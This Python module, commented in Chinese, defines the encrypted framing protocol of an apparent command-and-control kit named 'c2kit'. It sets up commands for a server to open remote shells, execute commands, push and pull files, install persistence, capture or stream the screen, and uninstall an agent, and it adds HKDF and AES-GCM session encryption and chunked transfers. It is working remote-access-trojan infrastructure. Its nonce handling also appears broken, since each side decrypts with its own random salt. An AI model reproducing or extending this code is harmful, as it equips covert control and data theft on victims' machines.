```python
# -*- coding: utf-8 -*-
"""分帧协议 + AES-GCM 会话加密。客户端与服务端共用。"""
import os, struct, socket, json, uuid, hashlib

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

MAGIC   = b'\xAB\xCD'
VER     = 1
HDR_FMT = '>2sBBHII'          # magic, ver, cmd, flags, counter, ctlen
HDR     = struct.Struct(HDR_FMT)
HDRLEN  = HDR.size             # 14
SZ_FMT  = '>I'
TAGLEN  = 16
MAXFRAME = 8 * 1024 * 1024


class C:
    # ---- 服务端 -> 客户端 ----
    PING          = 0x0001
    PONG          = 0x0002
    SHELL_OPEN    = 0x0010
    SHELL_IN      = 0x0011
    SHELL_CLOSE   = 0x0012
    EXEC          = 0x0013
    FILE_GET      = 0x0014      # 客户端 -> 服务端 拉文件
    FILE_PUT      = 0x0015      # 服务端 -> 客户端 推文件（agent 先回 ACK）
    INFO          = 0x0016
    PERSIST       = 0x0020
    UNPERSIST     = 0x0021
    UNINSTALL     = 0x0022
    SCREEN        = 0x0030      # 单帧
    SCREEN_STREAM = 0x0031      # 持续推流
    SCREEN_STOP   = 0x0032
    EXIT          = 0x0033
    LISTDIR       = 0x0034
    # ---- 客户端 -> 服务端 ----
    HELLO         = 0x0101
    ACK           = 0x0102
    ERR           = 0x0103
    EXEC_OUT      = 0x0113
    # ---- 双向分块流 ----
    CH_BEGIN      = 0x0201      # payload: json {tid,kind,name,total,meta}
    CH_DATA       = 0x0202      # payload: raw bytes
    CH_END        = 0x0203      # payload: json {tid,sha256,total}
    # ---- 握手（明文）----
    HS_C          = 0x0F01
    HS_S          = 0x0F02


def cmd_name(v):
    for k in dir(C):
        if not k.startswith("_") and getattr(C, k) == v:
            return k
    return "0x%04x" % v


class ProtoError(Exception):
    pass


def derive_key(psk: bytes, c_nonce: bytes, s_nonce: bytes) -> bytes:
    return HKDF(
        algorithm=hashes.SHA256(), length=32,
        salt=c_nonce + s_nonce, info=b'c2kit-session-v1'
    ).derive(psk)


class Crypto:
    """AES-GCM。nonce = session_salt(8B) + counter(4B)，hdr 作 AAD。"""

    def __init__(self, key: bytes):
        self.aead = AESGCM(key)
        self.salt = os.urandom(8)
        self.ctr = 0

    def next_nonce(self):
        self.ctr = (self.ctr + 1) & 0xFFFFFFFF
        return self.salt + struct.pack('>I', self.ctr)

    def seal(self, cmd: int, payload: bytes) -> bytes:
        ctr = self.ctr + 1
        hdr = HDR.pack(MAGIC, VER, cmd, 0, ctr,
                       len(payload) + TAGLEN)
        ct = self.aead.encrypt(self.next_nonce(), payload, hdr)
        return hdr + ct

    def open(self, frame: bytes):
        hdr, ct = frame[:HDRLEN], frame[HDRLEN:]
        magic, ver, cmd, flags, ctr, ctlen = HDR.unpack(hdr)
        if magic != MAGIC or ver != VER or len(ct) != ctlen:
            raise ProtoError("bad frame")
        pt = self.aead.decrypt(self.salt + struct.pack('>I', ctr), ct, hdr)
        return cmd, pt


def send_plain(sock: socket.socket, cmd: int, payload: bytes):
    hdr = HDR.pack(MAGIC, VER, cmd, 0, 0, len(payload))
    sock.sendall(SZ_FMT.pack(HDRLEN + len(payload)) + hdr + payload)


def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        b = sock.recv(n - len(buf))
        if not b:
            raise ConnectionError("peer closed")
        buf += b
    return bytes(buf)


def recv_plain(sock):
    (ln,) = struct.unpack(SZ_FMT, recv_exact(sock, 4))
    return recv_exact(sock, ln)


class Link:
    """加密信道。握手 -> send(cmd,data) / recv() -> (cmd,data) / send_obj / recv_obj。"""

    def __init__(self, sock, crypto: Crypto):
        self.s = sock
        self.c = crypto

    def send(self, cmd, payload=b''):
        self.s.sendall(SZ_FMT.pack(HDRLEN + len(payload) + TAGLEN)
                       + self.c.seal(cmd, payload))

    def send_obj(self, cmd, obj):
        self.send(cmd, json.dumps(obj, ensure_ascii=False).encode('utf-8'))

    def recv(self):
        (ln,) = struct.unpack(SZ_FMT, recv_exact(self.s, 4))
        if ln < HDRLEN + TAGLEN or ln > MAXFRAME:
            raise ProtoError("bad length %d" % ln)
        return self.c.open(recv_exact(self.s, ln))

    def recv_obj(self):
        cmd, data = self.recv()
        try:
            return cmd, json.loads(data.decode('utf-8'))
        except Exception:
            return cmd, None

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


# ---------- 分块流发送 / 接收 ----------

def chunk_send(link, kind, data: bytes, name: str = '', meta=None, piece=32768):
    tid = uuid.uuid4().hex[:12]
    link.send_obj(C.CH_BEGIN, {"tid": tid, "kind": kind, "name": name,
                               "total": len(data), "meta": meta or {}})
    for off in range(0, max(len(data), 1), piece):
        link.send(C.CH_DATA, data[off:off + piece])
    link.send_obj(C.CH_END, {"tid": tid, "sha256": hashlib.sha256(data).hexdigest(),
                             "total": len(data)})
    return tid


class ChunkReceiver:
    """agent / server 两端都用它收集 chunk。"""

    def __init__(self, on_done=None):
        self.bufs, self.meta = {}, {}
        self.on_done = on_done

    def feed(self, cmd, payload):
        if cmd == C.CH_BEGIN:
            o = json.loads(payload.decode())
            self.bufs[o['tid']] = bytearray()
            self.meta[o['tid']] = o
        elif cmd == C.CH_DATA:
            for t, b in self.bufs.items():
                b.extend(payload)
                break                      # 单流串行，够用
        elif cmd == C.CH_END:
            o = json.loads(payload.decode())
            data = bytes(self.bufs.pop(o['tid'], b''))
            m = self.meta.pop(o['tid'], {})
            if self.on_done:
                self.on_done(m, data, o)
